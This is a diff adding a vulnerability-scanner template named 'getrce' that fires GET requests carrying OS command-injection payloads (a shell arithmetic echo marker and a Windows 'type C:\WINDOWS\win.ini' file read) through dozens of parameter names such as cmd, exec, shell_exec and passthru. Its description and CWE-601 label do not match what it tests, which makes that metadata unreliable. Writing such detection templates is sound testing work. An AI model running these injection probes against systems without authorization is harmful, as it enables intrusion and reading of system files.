@@ -1,0 +1,49 @@
+id: getrce
+
+info:
+  name: getrce
+  author: erickfernandox
+  severity: medium
+  description: |
+    Verifica parametros ocultos que refletem dentro do HTML da pagina
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-601
+  metadata:
+    max-request: 2
+  tags: fuzzer, generic
+
+http:
+  - method: GET
+    path:
+     - "{{BaseURL}}?cmd=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&command=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&exec=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&execute=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&payload=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&code=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&shell=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&script=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&system=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&run=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&eval=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&proc=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV"
+     - "{{BaseURL}}?eval_base64=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&include=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&require=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&load=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&open=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&read=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&write=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&fetch=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&wget=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&curl=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&backtick_cmd=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&os_cmd=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&exec_cmd=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&proc_open=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&popen=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&passthru=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&system_exec=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV"
+     - "{{BaseURL}}?system_cmd=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&system_command=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&system_shell=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&shell_exec=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&assert=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&assertion=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&assert_code=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&assert_eval=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&assert_php=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&assert_template=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&eval_shell=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&exec_shell=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV&shell_eval=%3Becho%20ADD-CMD%24%28%2880%2B20%29%29%24%28echo%20GAURAV%29GAURAV"
+     - "{{BaseURL}}?cmd=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&command=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&exec=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&execute=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&payload=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&code=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&shell=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&script=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&system=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&run=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&eval=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&proc=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini"
+     - "{{BaseURL}}?eval_base64=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&include=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&require=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&load=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&open=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&read=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&write=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&fetch=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&wget=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&curl=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&backtick_cmd=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&os_cmd=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&exec_cmd=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&proc_open=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&popen=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&passthru=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&system_exec=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini"
+     - "{{BaseURL}}?system_cmd=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&system_command=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&system_shell=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&shell_exec=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assert=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assertion=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assert_code=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assert_eval=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assert_php=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&assert_template=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&eval_shell=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&exec_shell=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini&shell_eval=%26type%20C%3A%5C%5CWINDOWS%5C%5Cwin.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:                    
+          - 'ADD-CMD100GAURAVGAURAV'
+          - '[mci extensions]'
+
+        condition: and
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+        condition: and
+
+      - type: status
+        status:
+          - 200
+          - 404
+          - 501
+          - 302
